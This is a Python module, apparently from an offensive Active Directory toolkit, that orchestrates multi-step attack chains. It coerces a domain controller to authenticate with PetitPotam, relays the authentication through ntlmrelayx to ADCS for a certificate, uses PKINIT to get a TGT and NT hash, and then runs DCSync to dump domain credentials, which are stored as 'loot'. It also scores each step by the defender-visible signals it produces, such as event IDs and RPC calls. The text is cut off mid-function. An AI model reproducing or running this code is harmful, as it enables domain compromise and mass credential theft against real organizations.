"""Coerce chain — multi-step, multi-host attack orchestration.

fieldkit's charter piece: recce stops at the trigger, fieldkit executes
past it. A coerce chain is what "past the trigger" actually means when
the target is Active Directory — an operator forces a target host to
authenticate outbound, relays that auth to a second service to obtain a
credential or certificate, then walks the credential into ACLs, tickets,
and DA.

This module is the state machine that walks a chain. It has NO opinion
about which primitives run at each step — those live in :mod:`fieldkit.coerce`
(D2), :mod:`fieldkit.relay` (D3), and the post-relay actions in
:mod:`fieldkit.adcs` / :mod:`fieldkit.kerberos` (D4). The chain module
composes them.

Design shape
------------

  * :class:`Step` — an atomic move: reachability probe, coerce trigger,
    relay listener start/stop, cert-request post-action, DCSync. Each
    Step names its *kind* (``preflight`` / ``target-side`` / ``attacker-side``),
    carries a numeric *detection_cost* (D6 wires this into scoring),
    and exposes a callable ``action(chain, ctx) -> Outcome``.

  * :class:`Outcome` — the result of running a Step. ``kind`` is one of:
    ``ok`` (proceed), ``skip`` (this branch doesn't apply, try the
    fallback profile), ``fail`` (the chain aborts at this step),
    ``manual`` (fieldkit prepared the step but the operator must fire
    it — used when the listener can't bind locally and the fallback is
    "here's the ntlmrelayx command you run").

  * :class:`Chain` — a named recipe (``esc8`` / ``rbcd`` / ``smb-relay-exec``)
    of ordered Steps, plus the runtime state (which step is current, per-
    step outcomes, any accumulated evidence — a cert, a TGT, a hash).

  * :func:`register` / :func:`profile` — a module-scoped registry so
    tests + operators can list available profiles by name. New profiles
    (D5) plug in by decorating a factory function.

D1 landing surface
------------------

Only the state machine + one primitive (reachability preflight) are real
in D1. Every subsequent step in the shipped esc8 profile returns
``Outcome(kind="manual", …)`` with a placeholder message pointing at the
subsequent slice's ETA. The whole flow is walkable end-to-end so the
CLI ``fieldkit chain run esc8 <target>`` produces a full trail against a
mock target — proves the shape without pretending the primitives work
yet.
"""
import os
from dataclasses import dataclass, field
from typing import Callable, Optional

from .state import utcnow


#: Allowed :attr:`Outcome.kind` values. See the module docstring for the
#: semantics fieldkit assigns to each.
OUTCOME_KINDS = frozenset({"ok", "skip", "fail", "manual"})

#: Allowed :attr:`Step.kind` values. The kind gates where the step's
#: side effect actually lands: ``preflight`` never touches the target
#: network (socket probes only); ``target-side`` runs on the foothold
#: (or against the target directly); ``attacker-side`` runs on the
#: fieldkit machine itself (listener, decrypt, subprocess).
STEP_KINDS = frozenset({"preflight", "target-side", "attacker-side"})


#: Detection signal kinds. Each names a concrete artifact the target's
#: SOC/EDR would see when the step runs. The kind categorizes the
#: signal so the debt aggregator can weight it (a Windows event ID
#: alerts differently from an RPC endpoint call).
SIGNAL_KINDS = frozenset({
    "win-event",     # Windows Security event log entry (e.g. 4624/4769)
    "rpc-call",      # DCERPC endpoint interaction (MS-EFSR, MS-DRSR)
    "smb-conn",      # SMB session an EDR-side sensor might correlate
    "ldap-write",    # LDAP write (msDS-*, ACL edit)
    "kerb-ticket",   # Kerberos ticket request pattern (TGS-REQ, PKINIT AS-REQ)
    "http-req",      # HTTP endpoint interaction (ADCS enroll)
    "process-exec",  # child process spawn on the target host
    "auth-attempt",  # authentication attempt visible to auth logs
})


#: Numeric weights per signal kind. Represents the relative cost of
#: ONE occurrence to a mature SOC — an RPC call from a workstation
#: to a DC is a stronger signal than an SMB connection from that same
#: workstation (SMB is background noise; RPC to DRSUAPI isn't). D6
#: pins these; D5+ profiles may extend the catalog.
#:
#: Aggregated cost = sum(weight[kind] * occurrences) across every
#: signal a walked step emits. Kept multiplicative so a step that
#: emits 50 auth-attempts (a spray) costs 50 * 1 = 50 units, while a
#: step that emits 1 rpc-call to MS-DRSR costs 8 — the report renders
#: both honestly.
SIGNAL_WEIGHTS = {
    "win-event":     3,
    "rpc-call":      8,   # DRSUAPI / MS-EFSR calls are high-signal
    "smb-conn":      1,
    "ldap-write":    5,
    "kerb-ticket":   2,
    "http-req":      1,
    "process-exec":  4,
    "auth-attempt":  1,
}


@dataclass(frozen=True)
class DetectionSignal:
    """One concrete artifact a step generates that a defender's
    tooling can see.

    :attr:`kind` — one of :data:`SIGNAL_KINDS`.
    :attr:`identifier` — the specific signal within the kind. For
        win-event it's the event ID as a string (``"4769"``); for
        rpc-call it's ``<interface>/<opcode>`` (``"MS-EFSR/9"``); for
        smb-conn it's the pipe/share (``"IPC$"``); etc.
    :attr:`count` — how many occurrences the step emits per firing.
        Defaults to 1; a spray step overrides.
    :attr:`note` — one-line human context: what the SOC would
        actually SEE — "sshd auth failure ×10 from same IP" — so a
        defender reading the chain report knows what to hunt for.
    """
    kind: str
    identifier: str
    count: int = 1
    note: str = ""

    def __post_init__(self):
        if self.kind not in SIGNAL_KINDS:
            raise ValueError(
                f"DetectionSignal.kind must be one of {sorted(SIGNAL_KINDS)}, "
                f"got {self.kind!r}")
        if self.count < 0:
            raise ValueError(f"count must be non-negative, got {self.count}")

    @property
    def cost(self):
        """Weight × count. Zero-count signals surface for
        documentation ("this step COULD emit X") without adding
        debt."""
        return SIGNAL_WEIGHTS.get(self.kind, 1) * self.count


@dataclass(frozen=True)
class Step:
    """One atomic move in a coerce chain.

    ``action`` receives ``(chain, ctx)`` and returns an :class:`Outcome`.
    ``ctx`` is opaque here — every profile hands its own context object
    (Store, target IP, credential, arsenal paths). The chain module never
    inspects ``ctx`` — it just threads it through.

    ``detection_cost`` is a numeric estimate of the noise this step
    generates on a mature SOC's timeline. D1 shipped it as a
    hand-picked 0-10 integer; D6 gives it a concrete grounding:
    :attr:`signals` names the specific event IDs / RPC calls /
    ticket requests the step emits, and their SIGNAL_WEIGHTS-based
    sum is what feeds the chain-level debt aggregate. The literal
    ``detection_cost`` stays available as a coarse fallback when a
    step has no signal catalog yet.

    :attr:`signals` — tuple of :class:`DetectionSignal`. Empty for
        preflight steps (a TCP probe emits no defender-visible
        signal). Populated for coerce / relay / post-relay actions.
    """
    name: str
    kind: str
    action: Callable
    detection_cost: int = 0
    signals: tuple = ()

    def __post_init__(self):
        if self.kind not in STEP_KINDS:
            raise ValueError(f"Step.kind must be one of {sorted(STEP_KINDS)}, got {self.kind!r}")
        if not (0 <= self.detection_cost <= 10):
            raise ValueError(
                f"Step.detection_cost must be 0-10, got {self.detection_cost}")

    @property
    def signal_cost(self):
        """Total cost from :attr:`signals`; 0 when the step has no
        signal catalog (falls back to :attr:`detection_cost` for the
        aggregate)."""
        return sum(s.cost for s in self.signals)


@dataclass(frozen=True)
class Outcome:
    """The result of running one :class:`Step`.

    * ``kind == "ok"`` — proceed to the next step.
    * ``kind == "skip"`` — this branch doesn't apply on this target; the
      profile may declare a fallback or the chain aborts. D1 treats
      ``skip`` as terminal (no fallback logic yet — lands in D4/D5).
    * ``kind == "fail"`` — the step ran but hit a hard error; the chain
      aborts and the trail records the reason.
    * ``kind == "manual"`` — fieldkit prepared the step but the operator
      must fire it (listener can't bind locally, elevated coerce needs
      a domain admin cred not in Store, etc.). D1 treats ``manual`` as
      an advance so the walk completes; the operator picks up from the
      trail.

    ``data`` is the step's produced state (a cert bytes blob, a TGT, a
    recovered hash). The chain accumulates ``data`` dicts into
    ``Chain.artifacts`` so downstream steps can consume upstream output.
    """
    kind: str
    evidence: str
    data: dict = field(default_factory=dict)

    def __post_init__(self):
        if self.kind not in OUTCOME_KINDS:
            raise ValueError(
                f"Outcome.kind must be one of {sorted(OUTCOME_KINDS)}, got {self.kind!r}")


@dataclass
class Chain:
    """A named recipe + the state as it walks the steps.

    :attr:`profile` names the recipe (``esc8`` / ``rbcd`` / …).
    :attr:`target` is the primary target — the DC for esc8, the
    workstation being pivoted onto for rbcd, the auth-relay endpoint
    for smb-relay-exec.
    :attr:`steps` is the ordered tuple of :class:`Step` objects.

    :attr:`current` is the index into ``steps`` of the NEXT step to
    run. :attr:`outcomes` is the trail — one Outcome per step actually
    executed. :attr:`artifacts` accumulates every step's ``Outcome.data``,
    so a downstream step can read ``chain.artifacts["cert"]`` even though
    the cert was produced two steps back.

    :attr:`status` is derived from the walk state:
      * ``"planned"`` — no steps run yet;
      * ``"in_progress"`` — some steps ran, more to go;
      * ``"proven"`` — every step ran, last outcome was ``ok`` (or
        ``manual`` — the operator has to finish the manual step, but
        the chain's plan is complete);
      * ``"aborted"`` — a step returned ``fail`` or ``skip`` and no
        fallback profile picked up.
    """
    profile: str
    target: str
    steps: tuple
    current: int = 0
    outcomes: list = field(default_factory=list)
    artifacts: dict = field(default_factory=dict)
    aborted_reason: Optional[str] = None
    started_at: Optional[str] = None
    finished_at: Optional[str] = None

    @property
    def status(self):
        if not self.outcomes:
            return "planned"
        if self.aborted_reason:
            return "aborted"
        if self.current >= len(self.steps):
            return "proven"
        return "in_progress"

    @property
    def total_detection_cost(self):
        """Chain-total debt across every step actually walked
        (skipped/failed steps count once — the cost lands as soon as
        the step runs).

        D6 landing: prefers :attr:`Step.signal_cost` when the step
        carries a signals catalog; falls back to the coarse
        :attr:`Step.detection_cost` when signals is empty. This lets
        legacy steps and D6-refined steps coexist without a big-bang
        renumbering — a profile can add signals to one step at a time
        and its total_detection_cost stays coherent throughout the
        transition.
        """
        walked = self.steps[:len(self.outcomes)]
        total = 0
        for s in walked:
            total += s.signal_cost if s.signals else s.detection_cost
        return total

    @property
    def debt_breakdown(self):
        """Per-step debt breakdown for `chain show`: returns a list of
        ``{step, cost, signals}`` dicts, one per walked step. `signals`
        is the tuple of :class:`DetectionSignal` for the step (empty
        when the step hasn't been priced yet). Used by the CLI's
        `chain show` rendering and by the D6 tests to pin the
        aggregate numbers."""
        out = []
        for i, s in enumerate(self.steps[:len(self.outcomes)]):
            cost = s.signal_cost if s.signals else s.detection_cost
            out.append({"step": s.name, "cost": cost, "signals": s.signals})
        return out


# ---------------------------------------------------------------- profile registry

#: name → factory(**kwargs) -> Chain. Populated by :func:`register`.
_PROFILES = {}


def register(name):
    """Decorator: register a chain factory under ``name``. The factory
    signature is per-profile; the registry just stores the callable.

    Example::

        @register("esc8")
        def esc8_chain(target_dc, relay_target=None):
            return Chain(profile="esc8", target=target_dc, steps=(...))
    """
    def _r(factory):
        if name in _PROFILES:
            raise ValueError(f"chain profile {name!r} already registered")
        _PROFILES[name] = factory
        return factory
    return _r


def profile(name):
    """Look up a registered profile factory; raises KeyError if absent."""
    if name not in _PROFILES:
        raise KeyError(
            f"unknown chain profile {name!r}; registered: {sorted(_PROFILES)}")
    return _PROFILES[name]


def known_profiles():
    """Sorted list of every registered profile name — feeds the CLI's
    argparse choices + the report renderer."""
    return sorted(_PROFILES)


# ---------------------------------------------------------------- walker

def resume(store, chain_id):
    """Reconstruct a Chain from a persisted ``in_progress`` chain row,
    ready for :func:`walk` to continue where the previous walk stopped.

    Rebuilds by calling the profile factory against the stored target
    (so the fresh Chain has the current step catalog + current
    signal costs), then seeds ``chain.outcomes`` with the persisted
    trail so ``chain.current == len(outcomes)`` — walk() then picks
    up at the next unwalked step.

    Also stamps ``chain._persisted_id`` so mid-walk artifact
    persistence (chain-id-linked cert rows, etc.) keeps writing
    against the same chain row rather than a new one.

    Raises :class:`KeyError` when the chain row doesn't exist, or when
    the profile is no longer registered. Raises :class:`ValueError`
    when the chain isn't resumable (status != in_progress), or when
    the persisted step names have drifted from the current profile
    (rare — profile refactor without a chain-id migration).
    """
    row = store.chain_by_id(chain_id)
    if row is None:
        raise KeyError(f"no chain #{chain_id} in this engagement")
    if row["status"] != "in_progress":
        raise ValueError(
            f"chain #{chain_id} status is {row['status']!r} — "
            "only in_progress chains can be resumed")
    profile_name = row["profile"]
    target = row["target"]
    factory = profile(profile_name)                 # raises KeyError on drop
    chain = factory(target)
    # Preserve original started_at so the total-elapsed metric stays
    # coherent across resume boundaries.
    if row.get("started_at"):
        chain.started_at = row["started_at"]
    trail = store.chain_step_trail(chain_id)
    # Validate step-name alignment before mutating chain state — a
    # drift here means the profile catalog has changed under our
    # feet and the old trail is no longer a prefix of the new plan.
    for t in trail:
        idx = t["idx"]
        if idx >= len(chain.steps):
            raise ValueError(
                f"chain #{chain_id}: persisted step idx {idx} "
                f"exceeds current profile length {len(chain.steps)}")
        if chain.steps[idx].name != t["step_name"]:
            raise ValueError(
                f"chain #{chain_id}: persisted step {idx} "
                f"{t['step_name']!r} != current profile step "
                f"{chain.steps[idx].name!r} — profile has drifted")
    # Seed outcomes from persisted trail (idx-ordered by
    # chain_step_trail). Store the outcomes as they were captured;
    # data-carrying artifacts are lost on resume (they lived only in
    # the walker's memory), so a resumed chain can't re-populate
    # chain.artifacts — steps that need those artifacts will fail
    # gracefully and the operator can restart the profile.
    for t in trail:
        chain.outcomes.append(Outcome(
            kind=t["outcome_kind"],
            evidence=t["evidence"] or ""))
    chain.current = len(chain.outcomes)
    chain._persisted_id = chain_id                   # noqa: SLF001
    return chain


def walk(chain, ctx, on_step=None, before_step=None):
    """Run every remaining step of ``chain``, in order. Returns the
    chain object mutated in-place (caller reads ``chain.status`` +
    ``chain.outcomes`` for the result).

    Halts at the first step returning ``fail`` or ``skip`` (D1 has no
    fallback logic — D5 adds profile-chaining). ``manual`` outcomes DO
    NOT halt; the walker advances so the whole plan is walkable and
    the trail records what the operator needs to finish.

    ``on_step(chain, step, outcome)`` (optional) is called after each
    step for CLI progress rendering.

    ``before_step(chain, step) -> str`` (optional) is called BEFORE
    each step. Return values control the walker:

      * ``"go"``   — run the step normally (default when callback
        omitted).
      * ``"skip"`` — record a ``manual`` outcome ("operator declined")
        and advance to the next step; the chain does NOT abort. Used
        by the interactive walker when the operator wants to jump a
        step without ending the plan.
      * ``"stop"`` — record a ``manual`` outcome ("operator stopped")
        and end the walk immediately without marking the chain
        aborted. Used when the operator wants to pause + resume
        later (chain status ends as ``in_progress``).

    Any other return value is treated as ``"go"``.
    """
    if chain.started_at is None:
        chain.started_at = utcnow()
    while chain.current < len(chain.steps):
        step = chain.steps[chain.current]
        # Operator confirm hook — the interactive walker uses this.
        decision = "go"
        if before_step is not None:
            try:
                decision = before_step(chain, step) or "go"
            except Exception:                                 # noqa: BLE001
                decision = "go"
        if decision == "skip":
            outcome = Outcome(
                kind="manual",
                evidence=f"operator skipped step {step.name!r}")
            chain.outcomes.append(outcome)
            if on_step:
                on_step(chain, step, outcome)
            chain.current += 1
            continue
        if decision == "stop":
            outcome = Outcome(
                kind="manual",
                evidence=f"operator stopped walk before {step.name!r}")
            chain.outcomes.append(outcome)
            if on_step:
                on_step(chain, step, outcome)
            chain.finished_at = utcnow()
            return chain
        try:
            outcome = step.action(chain, ctx)
        except Exception as exc:                              # noqa: BLE001
            outcome = Outcome(
                kind="fail",
                evidence=f"{type(exc).__name__}: {exc}")
        if not isinstance(outcome, Outcome):
            outcome = Outcome(kind="fail",
                              evidence=f"step returned {type(outcome).__name__}, "
                                       "expected Outcome")
        chain.outcomes.append(outcome)
        if outcome.data:
            chain.artifacts.update(outcome.data)
        if on_step:
            on_step(chain, step, outcome)
        if outcome.kind in ("fail", "skip"):
            chain.aborted_reason = f"step {step.name!r} returned {outcome.kind}: {outcome.evidence}"
            chain.finished_at = utcnow()
            return chain
        chain.current += 1
    chain.finished_at = utcnow()
    return chain


# ---------------------------------------------------------------- reachability preflight

def _reach_probe(chain, ctx):
    """Preflight: is the chain's target reachable from the fieldkit host?

    D1 uses a bare TCP probe (SMB port 445 by default; profiles can
    override via ``ctx.probe_port``). No auth attempt, no protocol
    handshake — just a connect() with a short timeout so an unreachable
    target aborts the chain before firing anything louder.
    """
    import socket
    target = chain.target
    port = getattr(ctx, "probe_port", 445)
    timeout = getattr(ctx, "probe_timeout", 3.0)
    try:
        with socket.create_connection((target, port), timeout=timeout):
            pass
    except OSError as exc:
        return Outcome(
            kind="fail",
            evidence=f"tcp connect {target}:{port} failed: {exc}",
            data={"probe": {"target": target, "port": port, "ok": False}})
    return Outcome(
        kind="ok",
        evidence=f"tcp {target}:{port} reachable",
        data={"probe": {"target": target, "port": port, "ok": True}})


REACHABILITY_STEP = Step(
    name="preflight:reachability",
    kind="preflight",
    action=_reach_probe,
    detection_cost=0,
    signals=(
        DetectionSignal(kind="smb-conn", identifier="tcp-syn/445",
                        note="single TCP SYN to SMB — noise-level"),
    ))


# ---------------------------------------------------------------- signal catalog
#
# Per-chain-step detection signal packs. Each entry is the tuple of
# :class:`DetectionSignal` a profile's step passes to :class:`Step`
# via ``signals=``. Numbers reflect what one firing costs (a spray
# would override count). Sources: MS-EFSR/MS-DRSR/MS-RPRN docs +
# Microsoft's "Audit Kerberos Authentication Service" event catalog +
# public detection guides (SpecterOps, Nathan McNulty, Elastic).

SIGNALS_PETITPOTAM_COERCE = (
    DetectionSignal(kind="rpc-call", identifier="MS-EFSR/EfsRpcOpenFileRaw",
                    note="single DCERPC call to lsarpc/efsrpc pipe"),
    DetectionSignal(kind="win-event", identifier="5145",
                    note="detailed file share access (auditing default off)"),
    DetectionSignal(kind="auth-attempt", identifier="outbound-ntlm-cb",
                    note="the coerced auth attempt itself"),
)
SIGNALS_RELAY_LISTEN = (
    # Listener runs on the fieldkit box, not the target — the coerced
    # auth arriving at the socket is captured by RELAY_CAPTURE_*, not
    # here. What relay:listen DOES emit that a defender may see:
    # ntlmrelayx binds a TCP socket on the attacker's box, which a
    # network-position sensor (netflow, host-agent on any adjacent
    # box, cloud VPC flow log) can observe as "0.0.0.0:445 listening
    # from an unexpected host". Weight-1 * count-1 = detection_cost=1
    # — matches the coarse fallback so total_detection_cost stays
    # stable.
    DetectionSignal(kind="smb-conn", identifier="listener-bind:tcp/445",
                    note="fieldkit's ntlmrelayx binding a listener "
                         "socket on the attacker box; visible via "
                         "adjacent netflow / host-agent telemetry"),
)
SIGNALS_RELAY_CAPTURE_ADCS = (
    DetectionSignal(kind="win-event", identifier="4624",
                    note="successful logon on the ADCS host (relayed auth)"),
    DetectionSignal(kind="http-req", identifier="certsrv/certfnsh.asp",
                    note="cert enrollment POST from the fieldkit IP"),
    DetectionSignal(kind="win-event", identifier="4886",
                    note="Certificate Services: request received"),
    DetectionSignal(kind="win-event", identifier="4887",
                    note="Certificate Services: request approved"),
)
SIGNALS_RELAY_CAPTURE_RBCD = (
    DetectionSignal(kind="win-event", identifier="4624",
                    note="successful logon on the DC (relayed auth)"),
    DetectionSignal(kind="ldap-write", identifier="msDS-AllowedToActOnBehalfOfOtherIdentity",
                    note="single LDAPS write on the target computer object"),
    DetectionSignal(kind="win-event", identifier="5136",
                    note="directory-service object modification"),
)
SIGNALS_RELAY_CAPTURE_SMBEXEC = (
    DetectionSignal(kind="win-event", identifier="4624",
                    note="successful logon on the SMB target (relayed auth)"),
    DetectionSignal(kind="process-exec", identifier="services.exe/cmd.exe",
                    note="the exec ntlmrelayx spawns on the SMB target"),
    DetectionSignal(kind="win-event", identifier="7045",
                    note="new service installed (ntlmrelayx default attack)"),
)
SIGNALS_CERT_REQUEST_VALIDATE = (
    # Local-only validation on the fieldkit box — parses the
    # captured cert/key material into an openssl-friendly form
    # before pkinit reads it. Zero target-visible signals; step's
    # detection_cost is 0 to match — honest zero rather than a
    # coarse-fallback placeholder.
)
SIGNALS_PKINIT_TGT = (
    DetectionSignal(kind="kerb-ticket", identifier="AS-REQ/PKINIT",
                    note="single PKINIT AS-REQ to the KDC"),
    DetectionSignal(kind="win-event", identifier="4768",
                    note="Kerberos TGT request (with cert-based pre-auth flag)"),
)
SIGNALS_DCSYNC = (
    DetectionSignal(kind="rpc-call", identifier="MS-DRSR/DRSGetNCChanges",
                    note="DRSUAPI replication call — the definitive DCSync signal"),
    DetectionSignal(kind="win-event", identifier="4662",
                    note="directory-service object access (auditing usually on for DCs)",
                    count=3),
)
SIGNALS_S4U2SELF = (
    DetectionSignal(kind="kerb-ticket", identifier="TGS-REQ/S4U2Self",
                    note="single S4U2Self TGS-REQ"),
    DetectionSignal(kind="win-event", identifier="4769",
                    note="Kerberos service ticket request"),
)
SIGNALS_ESC1_DISCOVER = (
    DetectionSignal(kind="ldap-write", identifier="CertificateTemplates enum",
                    count=0,
                    note="LDAP read on pKI-Certificate-Template (defensive-mon rarely alerts)"),
)
SIGNALS_ESC1_ENROLL = (
    DetectionSignal(kind="http-req", identifier="certsrv/certfnsh.asp",
                    note="certificate enrollment POST from operator IP"),
    DetectionSignal(kind="win-event", identifier="4886",
                    note="Certificate Services: request received"),
    DetectionSignal(kind="win-event", identifier="4887",
                    note="Certificate Services: request approved (auto-approved template)"),
    DetectionSignal(kind="win-event", identifier="4768",
                    note="TGT request adjacent to the enrolled cert (PKINIT)"),
)

# ---------------------------------------------------------------- NoPac signals

SIGNALS_NOPAC_QUOTA_CHECK = (
    DetectionSignal(kind="ldap-write", identifier="ms-DS-MachineAccountQuota read",
                    count=0,
                    note="LDAP read on domain-level attribute (rarely alerted)"),
)
SIGNALS_NOPAC_ADDCOMPUTER = (
    DetectionSignal(kind="ldap-write", identifier="msDS-CreatedComputer",
                    note="LDAP add of a Computer object (event 4741 on the DC)"),
    DetectionSignal(kind="win-event", identifier="4741",
                    note="A computer account was created — flags the source user"),
)
SIGNALS_NOPAC_SAM_SPOOF = (
    DetectionSignal(kind="ldap-write", identifier="sAMAccountName modify",
                    note="LDAP write flipping the new account's name to match a DC"),
    DetectionSignal(kind="win-event", identifier="4742",
                    note="Computer account was changed — flags the sAMAccountName rename"),
)
SIGNALS_NOPAC_S4U2SELF = (
    DetectionSignal(kind="kerb-ticket", identifier="TGS-REQ/S4U2Self",
                    note="S4U2Self TGS-REQ; server=krbtgt gets a DC ticket back"),
    DetectionSignal(kind="win-event", identifier="4769",
                    note="Kerberos service ticket request — DC-name'd account gets DC-authored ticket"),
)
SIGNALS_NOPAC_RESTORE = (
    DetectionSignal(kind="ldap-write", identifier="sAMAccountName revert",
                    note="LDAP write reverting the sAMAccountName back to the operator's placeholder"),
)


# ---------------------------------------------------------------- post-relay steps

def _cert_request_action(chain, ctx):
    """Validate the certificate captured by relay:capture: sanity-check
    it exists, has bytes, matches the expected principal.

    ADCS actually issued the cert during relay:capture (that's what
    the --adcs / --template ntlmrelayx flags do — they auto-request
    on the caught auth), so this step is verification, not another
    HTTP round-trip.
    """
    import base64
    _ = ctx
    cert_bytes = chain.artifacts.get("cert_bytes", "")
    principal = chain.artifacts.get("cert_principal", "")
    if not cert_bytes:
        return Outcome(
            kind="fail",
            evidence="no cert_bytes in chain artifacts — relay:capture didn't acquire a cert")
    if not principal:
        return Outcome(
            kind="fail",
            evidence="no cert_principal in chain artifacts — cannot proceed with PKINIT")
    try:
        raw = base64.b64decode(cert_bytes, validate=True)
    except Exception as exc:                                    # noqa: BLE001
        return Outcome(
            kind="fail",
            evidence=f"cert_bytes did not decode as base64: {exc}")
    if len(raw) < 100:
        return Outcome(
            kind="fail",
            evidence=f"cert bytes suspiciously small ({len(raw)}B) — likely bad relay capture")
    return Outcome(
        kind="ok",
        evidence=f"cert for {principal} validated ({len(raw)}B PFX)",
        data={"cert_pfx_len": len(raw)})


def _pkinit_action(chain, ctx):
    """Materialize the captured cert to disk, present it to the KDC
    via certipy-ad `auth`, land a TGT ccache + (if UnPAC-able) the
    machine account's NT hash.
    """
    import base64
    import tempfile
    from . import pkinit
    cert_bytes = chain.artifacts.get("cert_bytes", "")
    principal = chain.artifacts.get("cert_principal", "")
    domain = getattr(ctx, "domain", None)
    if not domain:
        return Outcome(
            kind="manual",
            evidence="no domain on ctx — pass --domain <AD-DOMAIN> to run PKINIT")
    if not cert_bytes or not principal:
        return Outcome(
            kind="fail",
            evidence="cert artifacts missing — post:cert-request must have failed")
    fd, pfx_path = tempfile.mkstemp(prefix="fk-pkinit-", suffix=".pfx")
    with os.fdopen(fd, "wb") as fh:
        fh.write(base64.b64decode(cert_bytes))
    result = pkinit.auth(
        principal=principal,
        pfx_path=pfx_path,
        domain=domain,
        dc_ip=chain.target,
        tool_bin=getattr(ctx, "pkinit_tool_bin", None),
        tool_timeout=getattr(ctx, "pkinit_timeout", 30))
    if result.kind == "no-tool":
        return Outcome(
            kind="manual",
            evidence=(f"certipy-ad not on PATH; PFX at {pfx_path}\n"
                      f"  run: {result.command_hint}"))
    if result.kind == "unreachable":
        return Outcome(kind="fail",
                        evidence=f"PKINIT to {chain.target} unreachable",
                        data={"pkinit_detail": result.detail})
    if result.kind == "kdc-reject":
        return Outcome(kind="fail",
                        evidence=(f"KDC rejected PKINIT — cert may be for a "
                                  f"different account (subject: {principal})"),
                        data={"pkinit_detail": result.detail[-512:]})
    if result.kind == "cert-invalid":
        return Outcome(kind="fail",
                        evidence="cert failed to load / decrypt into certipy",
                        data={"pkinit_detail": result.detail[-512:]})
    if result.kind != "ok":
        return Outcome(kind="fail",
                        evidence=f"PKINIT ended in unrecognized state ({result.kind})",
                        data={"pkinit_detail": result.detail[-512:]})
    store = getattr(ctx, "store", None)
    if store is not None:
        try:
            host_row = store.host_by_ip(chain.target)
            hid = host_row["id"] if host_row else None
        except Exception:                                       # noqa: BLE001
            hid = None
        if result.ccache_path:
            store.add_loot(host_id=hid, kind="ccache",
                            value=principal, path=result.ccache_path)
        if result.nt_hash:
            store.add_loot(host_id=hid, kind="nthash",
                            value=f"{principal}:{result.nt_hash}")
    evidence = f"TGT obtained for {principal}"
    if result.ccache_path:
        evidence += f" → {result.ccache_path}"
    if result.nt_hash:
        evidence += " (NT hash extracted)"
    return Outcome(
        kind="ok", evidence=evidence,
        data={"ccache_path": result.ccache_path,
              "pkinit_principal": principal,
              "pkinit_nt_hash": result.nt_hash})


def _dcsync_action(chain, ctx):
    """DCSync via nxc using either the PKINIT ccache OR the extracted
    NT hash. Recovered credentials land in Store when ctx.store is set."""
    from . import dcsync as dcsync_mod
    from . import creds as creds_mod
    ccache = chain.artifacts.get("ccache_path", "")
    nt_hash = chain.artifacts.get("pkinit_nt_hash", "")
    principal = chain.artifacts.get("pkinit_principal", "")
    domain = getattr(ctx, "domain", None)
    if not ccache and not (nt_hash and principal and domain):
        return Outcome(
            kind="fail",
            evidence=("dcsync needs ccache or (nt_hash + principal + domain) "
                      "— pkinit step must have failed"))
    if ccache:
        result = dcsync_mod.dcsync(
            dc_ip=chain.target,
            ccache_path=ccache,
            tool_bin=getattr(ctx, "dcsync_tool_bin", None),
            tool_timeout=getattr(ctx, "dcsync_timeout", 180))
    else:
        user = principal.split("/", 1)[-1] if "/" in principal else principal
        result = dcsync_mod.dcsync(
            dc_ip=chain.target,
            nt_hash=nt_hash, username=user, domain=domain,
            tool_bin=getattr(ctx, "dcsync_tool_bin", None),
            tool_timeout=getattr(ctx, "dcsync_timeout", 180))
    if result.kind == "no-tool":
        return Outcome(kind="manual",
                        evidence=f"nxc/netexec not on PATH; run:\n  {result.command_hint}")
    if result.kind == "denied":
        return Outcome(
            kind="fail",
            evidence="DRSGetNCChanges denied — machine account may lack DS-Replication rights",
            data={"dcsync_detail": result.detail[-512:]})
    if result.kind == "unreachable":
        return Outcome(kind="fail",
                        evidence=f"dcsync target {chain.target} unreachable",
                        data={"dcsync_detail": result.detail[-512:]})
    if result.kind != "ok":
        return Outcome(kind="fail",
                        evidence=f"dcsync ended in unrecognized state ({result.kind})",
                        data={"dcsync_detail": result.detail[-512:]})
    store = getattr(ctx, "store", None)
    persisted = 0
    if store is not None:
        for c in result.credentials:
            # c.principal is either "DOMAIN\user" (nxc) or bare user.
            # c.nt_hash is "LM:NT" (impacket format) — split so we
            # pass the NT portion to parse_credential's nt_hash kwarg.
            nt_only = c.nt_hash.split(":")[-1]
            try:
                parsed = creds_mod.parse_credential(
                    c.principal, nt_hash=nt_only)
                store.add_credential(parsed.credential,
                                     source=f"dcsync:{chain.target}")
                persisted += 1
            except Exception:                                   # noqa: BLE001
                pass
    return Outcome(
        kind="ok",
        evidence=(f"DCSync ok — {len(result.credentials)} account(s) recovered"
                  + (f", {persisted} persisted" if store is not None else "")),
        data={"dcsync_count": len(result.credentials),
              "dcsync_persisted": persisted})


# ---------------------------------------------------------------- relay steps

def _relay_listen_action(chain, ctx):
    """Spawn the ntlmrelayx listener with the profile's relay target.

    Reads from ``ctx``:
      * ``ctx.listener_ip`` (required) — the IP the coerce target will
        auth to. Usually the operator's Kali reachable from the
        target subnet.
      * ``ctx.ca_endpoint`` (esc8) — the CA host (for adcs-cert mode);
        without it, the step reports manual since ntlmrelayx has
        nowhere to relay the caught auth.
      * ``ctx.template`` (optional) — ADCS template name; default
        ``DomainController`` per the esc8 canonical.
      * ``ctx.relay_port_smb`` / ``ctx.relay_port_http`` (optional) —
        bind ports; defaults 445 / 80. Non-root operators want to
        pass 4445 / 8080.
      * ``ctx.relay_tool_bin`` (optional) — override the resolved
        ntlmrelayx binary path (test hook).
      * ``ctx.relay_bind_wait`` (optional) — how long to wait for a
        bind-ok signature before giving up; default 3.0s.

    On success the step registers the live :class:`~fieldkit.relay.Listener`
    into ``ctx._relay_listener`` (private-ish attribute the
    :func:`_relay_capture_action` step reads) AND updates
    ``ctx.listener_uri`` so the coerce step (which ran BEFORE this in
    the chain plan? — no, relay:listen runs before coerce for esc8;
    see the profile step order) has a real URI to point at.

    Wait — that's a note-to-future-self: the esc8 step order is
    reachability → coerce → relay:listen → relay:capture. So the
    coerce step in D2 needs the listener URI BEFORE relay:listen
    runs. Solution used here: ``_petitpotam_action`` calls
    :func:`fieldkit.relay.start` inline the first time it needs a
    listener_uri, stashes the Listener on ctx, and the later
    relay:listen step becomes a no-op if the listener is already
    running. See _ensure_listener().
    """
    listener = _ensure_listener(chain, ctx)
    if isinstance(listener, Outcome):
        return listener
    if not listener.listener_uri:
        return Outcome(
            kind="fail",
            evidence=("relay listener could not bind — check --relay-port-smb "
                      "/ --relay-port-http (default 445/80 need root)"),
            data={"relay_bind_lines": listener.captured_lines[-10:]})
    return Outcome(
        kind="ok",
        evidence=f"relay listener up at {listener.listener_uri} "
                 f"(pid {listener.proc.pid if listener.proc else '?'})",
        data={"relay_listener_uri": listener.listener_uri,
